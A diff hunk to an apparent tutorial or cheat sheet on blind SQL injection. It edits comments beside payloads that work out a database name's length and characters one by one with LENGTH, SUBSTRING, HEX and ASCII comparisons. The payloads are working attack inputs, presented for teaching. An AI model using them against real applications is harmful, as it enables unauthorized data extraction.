@@ -14,14 +14,14 @@ First, retrieve the database length:
 ```sql
 1' AND (SELECT LENGTH(database()))=1-- -  #False  
 1' AND (SELECT LENGTH(database()))=2-- -  #False
-1' AND (SELECT LENGTH(database()))=3-- -  #True -> It means the length of database is 3 characters.
+1' AND (SELECT LENGTH(database()))=3-- -  #True -> length of database is 3 characters.
 ```
 
 Second, retrieve the database name:
 ```sql
---True -> It means the first character is p. Note that ASCII code is in decimal
+--True -> It means the first character is p.
 1' AND (SELECT HEX(SUBSTRING(database(), 1, 1)))=HEX('p')-- -
-1' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))=112-- - 
+1' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))=112-- -  #ASCII code is in decimal
 
 --True -> It means the second character is w.
 1' AND (SELECT HEX(SUBSTRING(database(), 2, 1)))=HEX('w')-- -
